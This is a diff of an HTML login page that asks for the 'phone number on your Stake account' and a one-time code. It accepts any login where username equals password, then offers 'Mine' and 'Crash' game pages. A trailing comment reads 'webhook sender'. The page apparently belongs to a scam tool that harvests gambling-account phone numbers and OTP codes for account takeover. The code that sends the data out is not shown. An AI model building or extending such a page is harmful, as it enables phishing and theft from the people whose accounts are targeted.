@@ -50,7 +50,7 @@
 <body>
     <div class="login-container">
         <div class="login-box" id="phoneInput">
-            <h2>Enter Phone Number</h2>
+            <h2>Enter Phone Number On Your Stake Account.</h2>
             <input type="tel" id="phoneNumber" placeholder="Phone Number" maxlength="10">
             <button onclick="sendOTP()">Send OTP</button>
         </div>
@@ -64,6 +64,11 @@
             <input type="text" id="username" placeholder="Username">
             <input type="password" id="password" placeholder="Password">
             <button onclick="login()">Login</button>
+        </div>
+        <div class="login-box" id="gameChoice" style="display: none;">
+            <h2>Choose a Game</h2>
+            <button onclick="chooseGame('mine')">Mine</button>
+            <button onclick="chooseGame('crash')">Crash</button>
         </div>
     </div>
     <script>
@@ -96,11 +101,23 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             if (username === password && password === username) {
-                window.location.href = 'number.html';
+                document.getElementById('loginInput').style.display = 'none';
+                document.getElementById('gameChoice').style.display = 'block';
             } else {
                 alert('Invalid login');
+            }
+        }
+
+        function chooseGame(game) {
+            if (game === 'mine') {
+                window.location.href = 'mine.html';
+            } else if (game === 'crash') {
+                window.location.href = 'crash.html';
             }
         }
     </script>
 </body>
 </html>
+
+<!-- 
+webhook sender -->
